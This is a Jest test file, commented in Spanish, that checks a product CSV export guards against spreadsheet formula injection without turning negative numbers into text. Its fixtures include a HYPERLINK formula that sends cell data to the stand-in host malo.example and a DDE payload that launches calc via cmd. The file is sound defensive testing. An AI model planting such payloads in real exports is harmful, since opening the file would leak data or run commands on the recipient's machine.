/**
 * EXPORTACIONES — una celda que empieza por "=" es una FÓRMULA (2026-09-17).
 *
 * Excel y LibreOffice EJECUTAN el contenido de una celda que empieza por `=`,
 * `+`, `-` o `@`. Un producto llamado `=HYPERLINK("http://…"&A1)` convierte el
 * reporte que el dueño le manda a su contador en algo que se va a internet con
 * los datos de la fila, y quien lo abre no tiene forma de saberlo.
 *
 * Aquí el texto lo escribe el propio negocio, así que el riesgo es bajo — pero
 * el archivo se REENVÍA por fuera, y neutralizarlo cuesta una línea.
 *
 * ⚠️ Lo que NO puede pasar: que un número NEGATIVO se marque como texto. Un
 * `-120.50` empieza por `-` y no es una fórmula; convertirlo en texto le
 * rompería las sumas al contador, que es a quien va dirigido el archivo.
 */
jest.mock('../utils/push', () => ({
    enviarNotificacion: jest.fn(),
    getPrefs: jest.fn().mockResolvedValue({}),
}));

const request = require('supertest');
const { app, models, initTestDb, createTestOwner } = require('./setup');

let owner, token;
const auth = () => ({ Authorization: `Bearer ${token}` });

beforeAll(async () => {
    await initTestDb();
    const r = await createTestOwner();
    owner = r.user;
    token = r.token;
});

beforeEach(async () => {
    await models.Product.destroy({ where: {} });
});

async function csvDeProductos() {
    const r = await request(app).get('/api/exports/products').set(auth());
    expect(r.status).toBe(200);
    return r.text;
}

test('un nombre que empieza por "=" se neutraliza: no es una fórmula', async () => {
    await models.Product.create({
        name: '=HYPERLINK("http://malo.example"&A1,"clic")', price: 10, business_id: owner.id,
    });
    const csv = await csvDeProductos();
    // Va entrecomillado porque tiene comas; lo que importa es la comilla simple
    // ANTES del '=': con ella, la hoja de cálculo lo trata como texto.
    expect(csv).toContain(`"'=HYPERLINK`);
    expect(csv).not.toContain('"=HYPERLINK');
});

test('los otros tres arranques de fórmula también', async () => {
    for (const bicho of ['+SUM(A1)', '@SUM(A1)', '-2+3+cmd|\' /c calc\'!A1']) {
        await models.Product.destroy({ where: {} });
        await models.Product.create({ name: bicho, price: 10, business_id: owner.id });
        const csv = await csvDeProductos();
        expect(csv).toContain("'" + bicho.slice(0, 4));
    }
});

test('🔒 un NÚMERO negativo NO se toca: el contador tiene que poder sumarlo', async () => {
    await models.Product.create({ name: 'Devolución', price: 10, business_id: owner.id });
    const csv = await csvDeProductos();
    // El precio sale como número pelado, sin comilla delante.
    expect(csv).not.toMatch(/'-?\d+\.\d\d/);
    expect(csv).toMatch(/10\.00|10/);
});

test('un nombre normal viaja intacto', async () => {
    await models.Product.create({ name: 'Taco al pastor', price: 22, business_id: owner.id });
    const csv = await csvDeProductos();
    expect(csv).toContain('Taco al pastor');
    expect(csv).not.toContain("'Taco");
});
